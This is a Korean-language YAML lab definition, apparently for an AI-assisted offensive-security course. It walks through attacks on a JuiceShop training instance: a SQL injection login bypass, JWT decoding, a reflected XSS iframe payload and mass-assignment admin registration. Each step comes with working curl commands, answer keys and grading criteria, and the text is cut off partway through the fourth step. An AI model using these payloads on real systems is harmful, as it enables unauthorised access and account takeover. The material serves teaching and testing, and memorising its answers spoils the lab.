lab_id: attack-ai-week04
title: 웹 애플리케이션 공격 (Web App Attacks) (AI 지원)
version: ai
course: attack-ai
week: 4
description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다.
  OWASP Top 10 취약점을 직접 공략하고, 공격 원리와 대응 방안을 학습한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리를 이해하고 다양한 기법(Union, Blind, Error-based)을 실습한다
- XSS(Reflected, Stored, DOM-based)를 실행하고 위험성을 파악한다
- 웹 공격의 대응 방안(입력 검증, WAF, CSP)을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '
    OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
  hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라.\
    \ email에 ' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST\
    \ http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로
    이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
  verify:
    type: output_contains
    expect: token
    field: stdout
    semantic:
      intent: JuiceShop /rest/user/login SQL Injection 인증 우회 — email 필드에 apostrophe
        OR 1=1-- 페이로드 주입해 WHERE 절 tautology 로 첫 사용자(admin)로 로그인 + JWT 획득
      success_criteria:
      - curl -X POST JSON body 의 email 에 apostrophe·1=1·-- 주입
      - 응답 JSON 에 authentication.token 키 포함 (JWT 획득 성공)
      - Prepared Statement 로 방어 가능함 언급
      acceptable_methods:
      - curl -X POST -H Content-Type:application/json -d email SQLi payload
      - Burp Repeater 로 로그인 요청 변조
      - sqlmap --data --auth-type POST
      - python requests.post
      negative_signs:
      - 일반 이메일/비번으로 로그인 시도만
      - JWT 토큰 추출 없이 status code 만 확인
      - SQLi 방어(Prepared Statement) 언급 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
    \n | python3 -m json.tool"
  risk_level: medium
  bastion_prompt: 'JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에
    '' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
  hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
  category: analysis
  points: 10
  answer: "\U0001F916 프롬프트: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘\n\U0001F4CE 참고\
    \ (CLI): curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
    \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64
    디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: 획득한 JWT Base64URL 디코드 — header.payload.signature 중 payload 만 디코딩해 email·role·iat·exp
        클레임 확인
      success_criteria:
      - JWT 를 .으로 분리해 payload 부분 추출
      - base64.urlsafe_b64decode 로 디코딩 후 JSON 파싱
      - email 필드와 역할(role 또는 admin 표시) 확인
      acceptable_methods:
      - python3 -c import base64, json; ... urlsafe_b64decode
      - echo <payload> | base64 -d (padding 보정)
      - jwt_tool -d <token>
      - jwt.io 붙여넣기
      negative_signs:
      - signature 까지 디코딩 시도 (헛된 작업)
      - JSON 파싱 없이 바이너리 출력만
      - email/role 필드 해석 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
    \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
  risk_level: low
  bastion_prompt: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
- order: 3
  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
    src='javascript:alert(1)'> 페이로드를 사용하라.
  hint: 검색 쿼리에 HTML/JavaScript 코드를 삽입한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
    src=''javascript:alert(1)''> 페이로드를 사용해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'''
  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을
    피해자에게 전달하여 세션 탈취, 피싱 등을 수행할 수 있다.
  verify:
    type: output_contains
    expect: iframe
    field: stdout
    semantic:
      intent: JuiceShop 검색 엔드포인트 반사형 XSS — <iframe src=javascript:alert(1)> 페이로드 URL
        인코딩해서 q 파라미터에 주입
      success_criteria:
      - curl 로 %3Ciframe%20src%3Djavascript:alert(1)%3E 인코딩된 URL 요청
      - 응답에 iframe 또는 해당 페이로드 원형 반영(이스케이프 없이)
      - Reflected XSS 의 세션 탈취·피싱 활용 언급
      acceptable_methods:
      - curl -G --data-urlencode q=<payload> <url>
      - Burp Repeater 로 요청 변조
      - dalfox url <url>?q=FUZZ
      - XSStrike / XSSer 자동화
      negative_signs:
      - URL 인코딩 없이 원문 전송해 파싱 실패
      - 응답에서 페이로드 반영 여부 검증 없음
      - 'iframe/javascript: 대신 단순 alert() 만 시도'
  target_vm: attacker
  script: curl -s 'http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'
  risk_level: medium
  bastion_prompt: 'JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
    src=''javascript:alert(1)''> 페이로드를 사용해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
    Mass Assignment 취약점을 공략하라.
  hint: 등록 요청에 role 필드를 추가하여 전송하라
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로\
    \ 설정한 사용자를 등록하라. Mass Assignment 취약점을 공략해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST\
    \ http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\"\
    :\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\"\
    :\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접
    지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
  verify:
    type: output_contains
    expect:
    - email
    - admin
    field: stdout
    semantic:
      intent: JuiceShop /api/Users Mass Assignment — 등록 body 에 role:admin 필드 추가해 관리자
        권한 계정 생성 (OWASP A01 Broken Access Control)
      success_criteria:
      - curl -X POST /api/Users body 에 role:admin 포함
      - 응답 JSON 에 등록된 사용자 email 과 role 필드 확인
      - 서버가 클라이언트 role 입력을 검증 없이 바인딩하는 Mass Assignment 취약점 설명
      acceptable_methods:
      - curl POST JSON with role:admin
      - Burp Repeater 로 필드 추가
      - python requests.post(url, json={email, password, role:admin})
      - OWASP API6 Mass Assignment 가이드 참조
      negative_signs:
      - role 필드 없이 일반 등록
      - 생성 후 권한 확인 없이 status 만
      - Mass Assignment 개념 언급 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\"\
    ,\"passwordRepeat\":\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"\
    id\":1,\"question\":\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m\
    \ json.tool"
  risk_level: medium
  bastion_prompt: 'JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를
